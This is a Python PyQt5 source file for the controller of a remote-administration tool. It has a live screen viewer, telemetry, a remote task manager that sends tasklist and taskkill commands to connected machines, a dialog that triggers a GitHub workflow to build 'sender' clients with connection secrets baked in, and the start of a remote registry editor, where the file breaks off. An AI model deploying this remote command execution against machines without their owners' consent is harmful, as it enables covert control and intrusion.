import sys
import asyncio
import json
import os
import platform
import base64
import time
import uuid
import typing
import random
import math

# ── App version (change this when releasing a new version) ──
APP_VERSION = 'v1.0.1 BETA'

# pyre-ignore-all-errors[21]
from qasync import QEventLoop, QApplication as QAsyncApplication
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QLabel,
    QPushButton, QComboBox, QTextEdit, QLineEdit, QSplitter, QGroupBox,
    QFormLayout, QFileDialog, QTabWidget, QListWidget, QListWidgetItem,
    QStackedWidget, QInputDialog, QScrollArea, QFrame, QDialog,
    QGridLayout, QMenu, QSizePolicy, QProgressBar, QStyle, QGraphicsOpacityEffect,
    QTableWidget, QTableWidgetItem, QHeaderView, QAbstractItemView, QCheckBox,
    QTreeWidget, QTreeWidgetItem, QMessageBox
)
from PyQt5.QtGui import QPixmap, QImage, QCursor, QIcon, QPalette, QColor, QFont, QTextCursor
from PyQt5.QtCore import Qt, QTimer, QProcess, QSettings, QSize, QPropertyAnimation, QEasingCurve, QProcessEnvironment
import websockets

# Custom QLabel subclass for keyboard events
class StreamLabel(QLabel):
    def __init__(self, parent=None):
        # pyre-ignore[19]
        super().__init__(parent)
        self.setFocusPolicy(Qt.StrongFocus)
        self.setMinimumSize(1, 1)
        self.setSizePolicy(QSizePolicy.Ignored, QSizePolicy.Ignored)
        self._original_pixmap = None

    def setPixmap(self, pixmap):
        self._original_pixmap = pixmap
        if not pixmap or pixmap.isNull():
            super().setPixmap(pixmap)
        else:
            w, h = self.width(), self.height()
            if w > 0 and h > 0:
                print(f"[DEBUG] StreamLabel.setPixmap: original={pixmap.width()}x{pixmap.height()}, label={w}x{h}")
                super().setPixmap(pixmap.scaled(w, h, Qt.IgnoreAspectRatio, Qt.SmoothTransformation))
            else:
                super().setPixmap(pixmap)

    def resizeEvent(self, event):
        super().resizeEvent(event)
        print(f"[DEBUG] StreamLabel.resizeEvent: new size={self.width()}x{self.height()}")
        if self._original_pixmap and not self._original_pixmap.isNull():
            w, h = self.width(), self.height()
            if w > 0 and h > 0:
                super().setPixmap(self._original_pixmap.scaled(w, h, Qt.IgnoreAspectRatio, Qt.SmoothTransformation))

    def mousePressEvent(self, event):
        self.setFocus()
        if hasattr(self.parent(), 'handle_mouse_press'):
            self.parent().handle_mouse_press(event)
        super().mousePressEvent(event)

    def mouseReleaseEvent(self, event):
        if hasattr(self.parent(), 'handle_mouse_release'):
            self.parent().handle_mouse_release(event)
        super().mouseReleaseEvent(event)
    def keyPressEvent(self, event):
        self.setFocus()
        if hasattr(self.parent(), 'handle_key_press'):
            self.parent().handle_key_press(event)
    def keyReleaseEvent(self, event):
        self.setFocus()
        if hasattr(self.parent(), 'handle_key_release'):
            self.parent().handle_key_release(event)


class BuildOutputDialog(QDialog):
    """Dialog that runs a build script and shows output."""
    def __init__(self, parent, title, cwd, script_path):
        # pyre-ignore[19]
        super().__init__(parent)
        self.setWindowTitle(title)
        self.resize(600, 400)
        layout = QVBoxLayout()
        self.output = QTextEdit()
        self.output.setReadOnly(True)
        self.output.setStyleSheet('background: #1e1e1e; color: #d4d4d4; font-family: Consolas, monospace;')
        layout.addWidget(self.output)
        close_btn = QPushButton('Close')
        close_btn.clicked.connect(self.accept)
        layout.addWidget(close_btn)
        self.setLayout(layout)
        self._process = QProcess(self)
        self._process.readyReadStandardOutput.connect(self._on_stdout)
        self._process.readyReadStandardError.connect(self._on_stderr)
        self._process.finished.connect(self._on_finished)
        if sys.platform == 'win32':
            self._process.setProgram('cmd')
            self._process.setArguments(['/c', script_path])
        else:
            self._process.setProgram('bash')
            self._process.setArguments([script_path])
        self._process.setWorkingDirectory(cwd)
        self.output.setPlainText(f'Running: {script_path}\n\n')
        self._process.start()

    def _on_stdout(self):
        data = self._process.readAllStandardOutput().data()
        try:
            text = data.decode('utf-8', errors='replace')
            self.output.insertPlainText(text)
            self.output.ensureCursorVisible()
        except Exception:
            self.output.insertPlainText(str(data))

    def _on_stderr(self):
        data = self._process.readAllStandardError().data()
        try:
            text = data.decode('utf-8', errors='replace')
            self.output.insertPlainText(text)
            self.output.ensureCursorVisible()
        except Exception:
            self.output.insertPlainText(str(data))

    def _on_finished(self, code, status):
        self.output.insertPlainText(f'\n\n--- Exit code: {code} ---')

class GitHubBuildDialog(QDialog):
    """Dialog to trigger the GitHub Actions build-sender.yml workflow via the GitHub API."""

    _STYLE = (
        'QDialog { background: #0d0f14; }'
        'QLabel { color: #9a9cb0; font-size: 9pt; }'
        'QLineEdit { background: #1a1b24; color: #e8e9f5; border: 1px solid #2e3040;'
        '  border-radius: 6px; padding: 6px 10px; font-size: 9pt; }'
        'QLineEdit:focus { border: 1px solid #5865F2; }'
        'QPushButton { background: #5865F2; color: #fff; border: none; border-radius: 6px;'
        '  padding: 8px 18px; font-weight: bold; font-size: 9pt; }'
        'QPushButton:hover { background: #6c7af4; }'
        'QPushButton:disabled { background: #2e3040; color: #686a80; }'
    )

    def __init__(self, parent):
        # pyre-ignore[19]
        super().__init__(parent)
        self.main_win = parent
        self.setWindowTitle('Build Sender on GitHub')
        self.setFixedSize(460, 360)
        self.setStyleSheet(self._STYLE)
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self._config_path = parent._viewer_config_path
        self._build_ui()
        self._load_settings()

    def _build_ui(self):
        layout = QVBoxLayout()
        layout.setContentsMargins(24, 20, 24, 20)
        layout.setSpacing(10)

        title = QLabel('🌐  Trigger GitHub Actions Build')
        title.setAlignment(Qt.AlignCenter)
        title.setStyleSheet('font-size: 14px; font-weight: bold; color: #e8e9f5; border: none; padding-bottom: 4px;')
        layout.addWidget(title)

        sub = QLabel('Triggers <b>build-sender.yml</b> with your current connection settings baked in.')
        sub.setAlignment(Qt.AlignCenter)
        sub.setWordWrap(True)
        sub.setStyleSheet('color: #686a80; font-size: 8pt; border: none; padding-bottom: 6px;')
        layout.addWidget(sub)

        repo_lbl = QLabel('GitHub Repo  (owner/repo)')
        repo_lbl.setStyleSheet('font-weight: bold; color: #818cf8; border: none;')
        layout.addWidget(repo_lbl)
        self.repo_input = QLineEdit()
        self.repo_input.setPlaceholderText('e.g. jake/monitor')
        layout.addWidget(self.repo_input)

        pat_lbl = QLabel('Personal Access Token  (needs workflow scope)')
        pat_lbl.setStyleSheet('font-weight: bold; color: #818cf8; border: none;')
        layout.addWidget(pat_lbl)
        self.pat_input = QLineEdit()
        self.pat_input.setPlaceholderText('ghp_xxxxxxxxxxxx')
        self.pat_input.setEchoMode(QLineEdit.Password)
        layout.addWidget(self.pat_input)

        branch_lbl = QLabel('Branch')
        branch_lbl.setStyleSheet('font-weight: bold; color: #818cf8; border: none;')
        layout.addWidget(branch_lbl)
        self.branch_input = QLineEdit()
        self.branch_input.setPlaceholderText('master')
        self.branch_input.setText('master')
        layout.addWidget(self.branch_input)

        layout.addSpacing(4)

        self.status_lbl = QLabel('')
        self.status_lbl.setAlignment(Qt.AlignCenter)
        self.status_lbl.setWordWrap(True)
        self.status_lbl.setStyleSheet('color: #9a9cb0; font-size: 8pt; border: none;')
        layout.addWidget(self.status_lbl)

        btn_row = QHBoxLayout()
        cancel_btn = QPushButton('Cancel')
        cancel_btn.setStyleSheet('background: #22232d; color: #9a9cb0; border: 1px solid #3a3c4e;')
        cancel_btn.clicked.connect(self.reject)
        btn_row.addWidget(cancel_btn)
        self.trigger_btn = QPushButton('🚀  Trigger Build')
        self.trigger_btn.clicked.connect(self._trigger)
        btn_row.addWidget(self.trigger_btn)
        layout.addLayout(btn_row)

        self.setLayout(layout)

    def _load_settings(self):
        try:
            if os.path.exists(self._config_path):
                with open(self._config_path, 'r') as f:
                    cfg = json.load(f)
                gh = cfg.get('github', {})
                self.repo_input.setText(gh.get('repo', ''))
                self.pat_input.setText(gh.get('pat', ''))
                self.branch_input.setText(gh.get('branch', 'master'))
        except Exception:
            pass

    def _save_settings(self):
        try:
            cfg = {}
            if os.path.exists(self._config_path):
                with open(self._config_path, 'r') as f:
                    cfg = json.load(f)
            cfg['github'] = {
                'repo': self.repo_input.text().strip(),
                'pat': self.pat_input.text().strip(),
                'branch': self.branch_input.text().strip() or 'master',
            }
            with open(self._config_path, 'w') as f:
                json.dump(cfg, f, indent=2)
        except Exception:
            pass

    def _trigger(self):
        repo   = self.repo_input.text().strip()
        pat    = self.pat_input.text().strip()
        branch = self.branch_input.text().strip() or 'master'
        if not repo or '/' not in repo:
            self.status_lbl.setStyleSheet('color: #ef4444; font-size: 8pt; border: none;')
            self.status_lbl.setText('⚠ Enter a valid repo (owner/repo).')
            return
        if not pat:
            self.status_lbl.setStyleSheet('color: #ef4444; font-size: 8pt; border: none;')
            self.status_lbl.setText('⚠ Enter your GitHub Personal Access Token.')
            return
        self.trigger_btn.setEnabled(False)
        self.status_lbl.setStyleSheet('color: #fbbf24; font-size: 8pt; border: none;')
        self.status_lbl.setText('⏳ Triggering workflow...')
        self._save_settings()
        asyncio.ensure_future(self._do_trigger(repo, pat, branch))

    async def _do_trigger(self, repo, pat, branch):
        import urllib.request, urllib.error
        url     = self.main_win.ws_url
        room    = self.main_win.room_id
        secret  = self.main_win.secret
        api_url = f'https://api.github.com/repos/{repo}/actions/workflows/build-sender.yml/dispatches'
        body = json.dumps({
            'ref': branch,
            'inputs': {'ws_url': url, 'room_id': room, 'secret': secret},
        }).encode('utf-8')
        req = urllib.request.Request(api_url, data=body, method='POST')
        req.add_header('Authorization', f'Bearer {pat}')
        req.add_header('Accept', 'application/vnd.github+json')
        req.add_header('Content-Type', 'application/json')
        req.add_header('X-GitHub-Api-Version', '2022-11-28')
        loop = asyncio.get_event_loop()
        try:
            def _post():
                with urllib.request.urlopen(req, timeout=15) as resp:
                    return resp.status
            status_code = await loop.run_in_executor(None, _post)
            actions_url = f'https://github.com/{repo}/actions'
            QTimer.singleShot(0, lambda: self._on_success(actions_url))
        except urllib.error.HTTPError as e:
            msg = f'GitHub API error {e.code}: {e.reason}'
            QTimer.singleShot(0, lambda m=msg: self._on_error(m))
        except Exception as e:
            QTimer.singleShot(0, lambda m=str(e): self._on_error(m))

    def _on_success(self, actions_url):
        self.trigger_btn.setEnabled(True)
        self.status_lbl.setStyleSheet('color: #4ade80; font-size: 8pt; border: none;')
        self.status_lbl.setText(
            f'✅ Build triggered! Check progress at:\n{actions_url}'
        )

    def _on_error(self, msg):
        self.trigger_btn.setEnabled(True)
        self.status_lbl.setStyleSheet('color: #ef4444; font-size: 8pt; border: none;')
        self.status_lbl.setText(f'❌ {msg}')

class MatrixRainWidget(QWidget):
    """Animated Matrix digital rain using QPainter."""
    def __init__(self, parent=None):
        # pyre-ignore[19]
        super().__init__(parent)
        self.setMinimumHeight(60)
        self._chars = list('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%^&*()!{}[]<>?/\\|=+-_~')
        self._cols: list = []
        self._drops: list = []
        self._speeds: list = []
        self._opacities: list = []
        self._char_grid: list = []
        self._char_h = 14
        self._char_w = 10
        self._timer = QTimer(self)
        self._timer.timeout.connect(self._tick)
        self._timer.start(60)
        self._initialized = False

    def showEvent(self, event):
        super().showEvent(event)
        self._init_cols()

    def resizeEvent(self, event):
        super().resizeEvent(event)
        self._init_cols()

    def _init_cols(self):
        cols = max(1, self.width() // self._char_w)
        rows = max(1, self.height() // self._char_h + 2)
        if cols == len(self._cols):
            return
        self._cols = list(range(cols))
        self._drops = [random.randint(-rows, 0) for _ in range(cols)]
        self._speeds = [random.randint(1, 3) for _ in range(cols)]
        self._opacities = [random.uniform(0.4, 1.0) for _ in range(cols)]
        self._char_grid = [[random.choice(self._chars) for _ in range(rows)] for _ in range(cols)]
        self._initialized = True

    def _tick(self):
        if not self._initialized or not self._cols:
            return
        rows = max(1, self.height() // self._char_h + 2)
        for i in range(len(self._cols)):
            self._drops[i] += self._speeds[i]
            if self._drops[i] > rows + 2:
                self._drops[i] = random.randint(-rows // 2, 0)
                self._speeds[i] = random.randint(1, 3)
                self._opacities[i] = random.uniform(0.4, 1.0)
            # Randomly mutate chars in column
            for r in range(len(self._char_grid[i])):
                if random.random() < 0.05:
                    self._char_grid[i][r] = random.choice(self._chars)
        self.update()

    def paintEvent(self, event):
        from PyQt5.QtGui import QPainter, QFont as QF, QColor as QC
        if not self._initialized:
            self._init_cols()
        painter = QPainter(self)
        painter.fillRect(self.rect(), QC('#0d0f14'))
        font = QF('Consolas', 9)
        font.setBold(True)
        painter.setFont(font)
        rows = max(1, self.height() // self._char_h + 2)
        for ci in range(len(self._cols)):
            drop_row = self._drops[ci]
            alpha = self._opacities[ci]
            for r in range(max(0, drop_row - rows), drop_row + 1):
                if r < 0 or r >= len(self._char_grid[ci]):
                    continue
                # Head of the drop is bright white, trail fades green
                dist = drop_row - r
                if dist == 0:
                    color = QC(220, 255, 220)
                elif dist == 1:
                    color = QC(100, 255, 120)
                else:
                    fade = max(0, 1.0 - dist / max(1, min(12, rows)))
                    g = int(200 * fade * alpha)
                    color = QC(0, g, int(g * 0.3))
                painter.setPen(color)
                x = ci * self._char_w
                y = r * self._char_h
                painter.drawText(x, y + self._char_h - 2, self._char_grid[ci][r])
        painter.end()

    def stop(self):
        self._timer.stop()

    def start(self):
        if not self._timer.isActive():
            self._timer.start(60)


class TelemetryDashboard(QWidget):
    """Enhanced telemetry dashboard with gradient bars, color-coded thresholds, and disk usage."""

    _BAR_NORMAL = (
        'QProgressBar { border: none; border-radius: 6px; text-align: center;'
        '  background-color: #1a1b24; color: #e8e9f5; font-weight: bold; font-size: 9pt; min-height: 22px; }'
        'QProgressBar::chunk { border-radius: 6px;'
        '  background: qlineargradient(x1:0,y1:0,x2:1,y2:0, stop:0 #5865F2, stop:1 #7289da); }'
    )
    _BAR_WARN = (
        'QProgressBar { border: none; border-radius: 6px; text-align: center;'
        '  background-color: #1a1b24; color: #e8e9f5; font-weight: bold; font-size: 9pt; min-height: 22px; }'
        'QProgressBar::chunk { border-radius: 6px;'
        '  background: qlineargradient(x1:0,y1:0,x2:1,y2:0, stop:0 #f59e0b, stop:1 #d97706); }'
    )
    _BAR_CRIT = (
        'QProgressBar { border: none; border-radius: 6px; text-align: center;'
        '  background-color: #1a1b24; color: #ffffff; font-weight: bold; font-size: 9pt; min-height: 22px; }'
        'QProgressBar::chunk { border-radius: 6px;'
        '  background: qlineargradient(x1:0,y1:0,x2:1,y2:0, stop:0 #ef4444, stop:1 #dc2626); }'
    )

    def __init__(self, parent=None):
        # pyre-ignore[19]
        super().__init__(parent)
        layout = QVBoxLayout()
        layout.setContentsMargins(10, 10, 10, 10)
        layout.setSpacing(10)

        # Telemetry title
        self.title_lbl = QLabel("Live Telemetry")
        self.title_lbl.setStyleSheet(
            "font-size: 14px; font-weight: bold; color: #818cf8;"
            "padding-bottom: 2px; border-bottom: 1px solid #2e3040;"
        )
        layout.addWidget(self.title_lbl)

        # CPU bar with label
        cpu_row = QVBoxLayout()
        cpu_row.setSpacing(2)
        cpu_lbl = QLabel("CPU")
        cpu_lbl.setStyleSheet("color: #686a80; font-size: 8pt; font-weight: bold;")
        cpu_row.addWidget(cpu_lbl)
        self.cpu_bar = QProgressBar()
        self.cpu_bar.setFormat("%p%")
        self.cpu_bar.setAlignment(Qt.AlignCenter)
        self.cpu_bar.setFixedHeight(24)
        self.cpu_bar.setStyleSheet(self._BAR_NORMAL)
        self.cpu_bar.setToolTip("CPU usage percentage")
        cpu_row.addWidget(self.cpu_bar)
        layout.addLayout(cpu_row)

        # RAM bar with label
        ram_row = QVBoxLayout()
        ram_row.setSpacing(2)
        ram_lbl = QLabel("Memory")
        ram_lbl.setStyleSheet("color: #686a80; font-size: 8pt; font-weight: bold;")
        ram_row.addWidget(ram_lbl)
        self.ram_bar = QProgressBar()
        self.ram_bar.setFormat("%p%")
        self.ram_bar.setAlignment(Qt.AlignCenter)
        self.ram_bar.setFixedHeight(24)
        self.ram_bar.setStyleSheet(self._BAR_NORMAL)
        self.ram_bar.setToolTip("RAM usage percentage")
        ram_row.addWidget(self.ram_bar)
        layout.addLayout(ram_row)

        # Disk bar with label
        disk_row = QVBoxLayout()
        disk_row.setSpacing(2)
        disk_lbl = QLabel("Disk")
        disk_lbl.setStyleSheet("color: #686a80; font-size: 8pt; font-weight: bold;")
        disk_row.addWidget(disk_lbl)
        self.disk_bar = QProgressBar()
        self.disk_bar.setFormat("%p%")
        self.disk_bar.setAlignment(Qt.AlignCenter)
        self.disk_bar.setFixedHeight(24)
        self.disk_bar.setStyleSheet(self._BAR_NORMAL)
        self.disk_bar.setToolTip("Disk usage percentage")
        disk_row.addWidget(self.disk_bar)
        layout.addLayout(disk_row)

        # Separator
        sep = QFrame()
        sep.setFrameShape(QFrame.HLine)
        sep.setStyleSheet("color: #2e3040;")
        layout.addWidget(sep)

        # Details text area
        self.other_details = QTextEdit()
        self.other_details.setReadOnly(True)
        self.other_details.setMinimumHeight(60)
        self.other_details.setStyleSheet(
            "background: #14151c; border: 1px solid #2e3040; border-radius: 6px;"
            "color: #9a9cb0; font-family: 'Consolas', monospace; font-size: 8pt; padding: 6px;"
        )
        layout.addWidget(self.other_details, 1)

        self.setLayout(layout)

    def _style_bar(self, bar, value):
        """Apply color-coded style based on threshold."""
        if value > 90:
            bar.setStyleSheet(self._BAR_CRIT)
        elif value > 75:
            bar.setStyleSheet(self._BAR_WARN)
        else:
            bar.setStyleSheet(self._BAR_NORMAL)

    def update_data(self, info):
        if not info:
            self.cpu_bar.setValue(0)
            self.ram_bar.setValue(0)
            self.disk_bar.setValue(0)
            self.cpu_bar.setStyleSheet(self._BAR_NORMAL)
            self.ram_bar.setStyleSheet(self._BAR_NORMAL)
            self.disk_bar.setStyleSheet(self._BAR_NORMAL)
            self.other_details.setPlainText('No telemetry data received.')
            return
        if isinstance(info, dict):
            cpu_val = info.get('cpu', info.get('cpu_percent', info.get('cpuPercent', 0)))
            ram_val = info.get('ram', info.get('ram_percent', info.get('memory_percent', info.get('memoryPercent', 0))))
            disk_val = info.get('disk', info.get('disk_percent', info.get('diskPercent', 0)))
            try:
                cpu_val = float(str(cpu_val).replace('%', ''))
                self.cpu_bar.setValue(int(cpu_val))
                self.cpu_bar.setFormat(f"CPU  {int(cpu_val)}%")
                self._style_bar(self.cpu_bar, cpu_val)
            except Exception:
                pass
            try:
                ram_val = float(str(ram_val).replace('%', ''))
                self.ram_bar.setValue(int(ram_val))
                self.ram_bar.setFormat(f"RAM  {int(ram_val)}%")
                self._style_bar(self.ram_bar, ram_val)
            except Exception:
                pass
            try:
                disk_val = float(str(disk_val).replace('%', ''))
                self.disk_bar.setValue(int(disk_val))
                self.disk_bar.setFormat(f"Disk  {int(disk_val)}%")
                self._style_bar(self.disk_bar, disk_val)
            except Exception:
                pass
            skip_keys = {'cpu', 'ram', 'disk', 'cpu_percent', 'ram_percent', 'disk_percent',
                         'cpuPercent', 'memoryPercent', 'diskPercent', 'memory_percent'}
            text = info.get('summary', '') or "\n".join(
                [f"{k}: {v}" for k, v in info.items() if k not in skip_keys and 'percent' not in k.lower()]
            )
            self.other_details.setPlainText(text)
        elif isinstance(info, str):
            self.other_details.setPlainText(info)


class TaskManagerWindow(QDialog):
    """Remote Task Manager — lists processes on the selected machine, allows killing them."""

    _DARK_STYLE = (
        'QDialog { background: #0d0f14; }'
        'QTableWidget { background: #12131a; color: #d4d4d4; border: 1px solid #2e3040;'
        '  gridline-color: #2e3040; font-family: Consolas, monospace; font-size: 8pt; }'
        'QTableWidget::item { padding: 2px 6px; }'
        'QTableWidget::item:selected { background: #5865F2; color: #fff; }'
        'QHeaderView::section { background: #1a1b24; color: #818cf8; border: 1px solid #2e3040;'
        '  padding: 4px 8px; font-weight: bold; font-size: 8pt; }'
        'QLineEdit { background: #1a1b24; color: #d4d4d4; border: 1px solid #2e3040;'
        '  border-radius: 4px; padding: 4px 8px; font-size: 9pt; }'
        'QPushButton { background: #1a1b24; color: #d4d4d4; border: 1px solid #3a3c4e;'
        '  border-radius: 4px; padding: 6px 14px; font-weight: bold; }'
        'QPushButton:hover { background: #2a2b3d; border-color: #5865F2; }'
        'QLabel { color: #9a9cb0; }'
        'QCheckBox { color: #9a9cb0; }'
    )

    def __init__(self, main_win):
        # pyre-ignore[19]
        super().__init__(main_win)
        self.main_win = main_win
        self.setWindowTitle('Task Manager')
        self.resize(820, 560)
        self.setStyleSheet(self._DARK_STYLE)
        self._pending_list_request: typing.Optional[str] = None
        self._pending_kill_request: typing.Optional[str] = None
        self._all_processes: list = []  # cached full list for filtering
        self._auto_refresh_timer = QTimer(self)
        self._auto_refresh_timer.timeout.connect(self.refresh_process_list)
        self._build_ui()

    def _build_ui(self):
        layout = QVBoxLayout()
        layout.setContentsMargins(10, 10, 10, 10)
        layout.setSpacing(8)

        # Title row
        title = QLabel('Remote Task Manager')
        title.setStyleSheet('font-size: 14px; font-weight: bold; color: #818cf8; border: none;')
        layout.addWidget(title)

        # Toolbar row
        toolbar = QHBoxLayout()
        toolbar.setSpacing(8)

        self.search_input = QLineEdit()
        self.search_input.setPlaceholderText('🔍  Filter processes...')
        self.search_input.textChanged.connect(self._apply_filter)
        self.search_input.setToolTip('Type to filter processes by name or PID')
        toolbar.addWidget(self.search_input, 1)

        self.refresh_btn = QPushButton('⟳  Refresh')
        self.refresh_btn.setToolTip('Fetch the current process list from the remote machine')
        self.refresh_btn.clicked.connect(self.refresh_process_list)
        toolbar.addWidget(self.refresh_btn)

        self.auto_refresh_check = QCheckBox('Auto (5s)')
        self.auto_refresh_check.setToolTip('Automatically refresh the process list every 5 seconds')
        self.auto_refresh_check.toggled.connect(self._toggle_auto_refresh)
        toolbar.addWidget(self.auto_refresh_check)

        self.kill_btn = QPushButton('☠  Kill Process')
        self.kill_btn.setStyleSheet(
            'QPushButton { background: #7f1d1d; color: #fca5a5; border: 1px solid #991b1b; }'
            'QPushButton:hover { background: #991b1b; color: #fff; }'
        )
        self.kill_btn.setToolTip('Kill the selected process (taskkill /F)')
        self.kill_btn.clicked.connect(self._kill_selected)
        toolbar.addWidget(self.kill_btn)

        layout.addLayout(toolbar)

        # Status / count label
        self.status_label = QLabel('Click Refresh to load processes.')
        self.status_label.setStyleSheet('color: #686a80; font-size: 8pt; border: none;')
        layout.addWidget(self.status_label)

        # Process table
        self.table = QTableWidget()
        self.table.setColumnCount(5)
        self.table.setHorizontalHeaderLabels(['Name', 'PID', 'Session', 'Memory (KB)', 'Status'])
        self.table.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.table.setSelectionMode(QAbstractItemView.ExtendedSelection)
        self.table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.table.setSortingEnabled(True)
        self.table.setAlternatingRowColors(True)
        self.table.setStyleSheet(
            self.table.styleSheet()
            + 'QTableWidget { alternate-background-color: #14151e; }'
        )
        header = self.table.horizontalHeader()
        header.setStretchLastSection(True)
        header.setSectionResizeMode(0, QHeaderView.Stretch)
        header.setSectionResizeMode(1, QHeaderView.ResizeToContents)
        header.setSectionResizeMode(2, QHeaderView.ResizeToContents)
        header.setSectionResizeMode(3, QHeaderView.ResizeToContents)
        self.table.verticalHeader().setVisible(False)
        self.table.verticalHeader().setDefaultSectionSize(22)
        self.table.setContextMenuPolicy(Qt.CustomContextMenu)
        self.table.customContextMenuRequested.connect(self._show_context_menu)
        layout.addWidget(self.table, 1)

        # Bottom row
        bottom = QHBoxLayout()
        close_btn = QPushButton('Close')
        close_btn.clicked.connect(self.hide)
        bottom.addStretch()
        bottom.addWidget(close_btn)
        layout.addLayout(bottom)

        self.setLayout(layout)

    def _toggle_auto_refresh(self, checked):
        if checked:
            self._auto_refresh_timer.start(5000)
            self.refresh_process_list()
        else:
            self._auto_refresh_timer.stop()

    def refresh_process_list(self):
        """Send a tasklist command to the remote machine."""
        if not self.main_win.selected_sender:
            self.status_label.setText('⚠ No sender selected.')
            return
        req_id = 'taskmgr-' + str(uuid.uuid4())
        self._pending_list_request = req_id
        self.status_label.setText('⏳ Loading process list...')
        self.refresh_btn.setEnabled(False)
        asyncio.ensure_future(self.main_win.send_ws({
            'type': 'remote-control',
            'action': 'execute-command',
            'machineId': self.main_win.selected_sender,
            'command': 'tasklist /FO CSV /NH',
            'requestId': req_id,
        }))

    def receive_command_output(self, request_id, output):
        """Called by the main window when a command-output arrives matching our request."""
        if request_id == self._pending_list_request:
            self._pending_list_request = None
            self.refresh_btn.setEnabled(True)
            self._parse_tasklist(output)
        elif request_id == self._pending_kill_request:
            self._pending_kill_request = None
            self.status_label.setText(f'Kill result: {output.strip()[:120]}')
            # Auto-refresh after kill
            QTimer.singleShot(800, self.refresh_process_list)

    def _parse_tasklist(self, raw_output):
        """Parse CSV output from tasklist /FO CSV /NH."""
        import csv
        import io
        self._all_processes.clear()
        lines = raw_output.strip().splitlines()
        reader = csv.reader(io.StringIO('\n'.join(lines)))
        for row in reader:
            if len(row) < 5:
                continue
            name = row[0].strip().strip('"')
            pid = row[1].strip().strip('"')
            session = row[2].strip().strip('"')
            session_num = row[3].strip().strip('"')
            mem_str = row[4].strip().strip('"').replace(',', '').replace(' K', '').replace(' ', '')
            # Try to parse memory as int for sorting
            try:
                mem_val = int(mem_str)
            except ValueError:
                mem_val = 0
            self._all_processes.append({
                'name': name,
                'pid': pid,
                'session': session,
                'mem_kb': mem_val,
                'status': session_num,
            })
        self._apply_filter()
        self.status_label.setText(f'{len(self._all_processes)} processes loaded.')

    def _apply_filter(self):
        """Filter the table based on search input."""
        query = self.search_input.text().strip().lower()
        filtered = self._all_processes
        if query:
            filtered = [p for p in self._all_processes
                        if query in p['name'].lower() or query in p['pid']]

        self.table.setSortingEnabled(False)
        self.table.setRowCount(len(filtered))
        for i, proc in enumerate(filtered):
            name_item = QTableWidgetItem(proc['name'])
            pid_item = QTableWidgetItem(proc['pid'])
            pid_item.setData(Qt.UserRole, proc['pid'])
            # Sort PID numerically
            try:
                pid_item.setData(Qt.DisplayRole, int(proc['pid']))
            except ValueError:
                pass
            session_item = QTableWidgetItem(proc['session'])
            mem_item = QTableWidgetItem()
            mem_item.setData(Qt.DisplayRole, proc['mem_kb'])
            status_item = QTableWidgetItem(proc['status'])

            self.table.setItem(i, 0, name_item)
            self.table.setItem(i, 1, pid_item)
            self.table.setItem(i, 2, session_item)
            self.table.setItem(i, 3, mem_item)
            self.table.setItem(i, 4, status_item)
        self.table.setSortingEnabled(True)

        if query:
            self.status_label.setText(f'{len(filtered)} of {len(self._all_processes)} processes shown.')

    def _kill_selected(self):
        """Kill the selected process(es)."""
        rows = set()
        for item in self.table.selectedItems():
            rows.add(item.row())
        if not rows:
            self.status_label.setText('⚠ Select a process to kill.')
            return
        pids = []
        names = []
        for row in rows:
            pid_item = self.table.item(row, 1)
            name_item = self.table.item(row, 0)
            if pid_item:
                pid_val = pid_item.data(Qt.UserRole) or pid_item.text()
                pids.append(str(pid_val))
            if name_item:
                names.append(name_item.text())
        if not pids:
            return
        # Confirm kill
        confirm_text = ', '.join(f'{n} (PID {p})' for n, p in zip(names, pids))
        if len(pids) > 3:
            confirm_text = f'{len(pids)} processes'
        reply = QInputDialog.getText(
            self, 'Confirm Kill',
            f'Kill {confirm_text}?\n\nType "yes" to confirm:',
        )
        if not reply[1] or reply[0].strip().lower() != 'yes':
            self.status_label.setText('Kill cancelled.')
            return
        # Send kill command
        pid_args = ' '.join(f'/PID {p}' for p in pids)
        cmd = f'taskkill /F {pid_args}'
        req_id = 'taskmgr-kill-' + str(uuid.uuid4())
        self._pending_kill_request = req_id
        self.status_label.setText(f'⏳ Killing {len(pids)} process(es)...')
        asyncio.ensure_future(self.main_win.send_ws({
            'type': 'remote-control',
            'action': 'execute-command',
            'machineId': self.main_win.selected_sender,
            'command': cmd,
            'requestId': req_id,
        }))

    def _show_context_menu(self, pos):
        """Right-click context menu on the process table."""
        item = self.table.itemAt(pos)
        if not item:
            return
        row = item.row()
        pid_item = self.table.item(row, 1)
        name_item = self.table.item(row, 0)
        if not pid_item:
            return
        pid = pid_item.data(Qt.UserRole) or pid_item.text()
        name = name_item.text() if name_item else '?'

        menu = QMenu(self)
        kill_act = menu.addAction(f'☠  Kill "{name}" (PID {pid})')
        kill_tree_act = menu.addAction(f'🌳  Kill process tree (PID {pid})')
        menu.addSeparator()
        copy_pid_act = menu.addAction(f'📋  Copy PID')
        copy_name_act = menu.addAction(f'📋  Copy name')

        action = menu.exec_(self.table.viewport().mapToGlobal(pos))
        if action == kill_act:
            self._kill_pid(pid, name)
        elif action == kill_tree_act:
            self._kill_pid(pid, name, tree=True)
        elif action == copy_pid_act:
            QApplication.clipboard().setText(str(pid))
        elif action == copy_name_act:
            QApplication.clipboard().setText(name)

    def _kill_pid(self, pid, name, tree=False):
        """Kill a single process by PID."""
        tree_flag = ' /T' if tree else ''
        cmd = f'taskkill /F /PID {pid}{tree_flag}'
        req_id = 'taskmgr-kill-' + str(uuid.uuid4())
        self._pending_kill_request = req_id
        self.status_label.setText(f'⏳ Killing {name} (PID {pid})...')
        asyncio.ensure_future(self.main_win.send_ws({
            'type': 'remote-control',
            'action': 'execute-command',
            'machineId': self.main_win.selected_sender,
            'command': cmd,
            'requestId': req_id,
        }))

    def showEvent(self, event):
        super().showEvent(event)
        # Auto-refresh on open if we have a sender
        if self.main_win.selected_sender and not self._all_processes:
            QTimer.singleShot(100, self.refresh_process_list)

    def hideEvent(self, event):
        super().hideEvent(event)
        self._auto_refresh_timer.stop()
        self.auto_refresh_check.setChecked(False)


class RegistryEditorWindow(QDialog):
    """Remote Windows Registry Editor — browse, edit, search, and manage registry keys and values."""

    _DARK_STYLE = (
        'QDialog { background: #0d0f14; }'
        'QTreeWidget { background: #12131a; color: #d4d4d4; border: 1px solid #2e3040;'
